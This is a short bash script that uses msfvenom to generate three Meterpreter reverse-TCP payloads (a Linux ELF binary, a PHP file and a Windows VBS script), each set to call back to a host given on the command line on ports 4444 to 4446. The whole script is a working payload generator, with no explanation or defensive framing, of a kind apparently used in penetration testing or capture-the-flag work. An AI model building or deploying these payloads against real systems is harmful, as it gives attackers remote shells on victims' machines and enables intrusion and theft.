#!/bin/bash
HOST=$1
msfvenom  -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$HOST LPORT=4444 > shell.elf
msfvenom  -p php/meterpreter/reverse_tcp -f raw LHOST=$HOST LPORT=4445 > shell.php
msfvenom  -p windows/meterpreter/reverse_tcp -f vbs LHOST=$HOST LPORT=4446 > shell.vbs

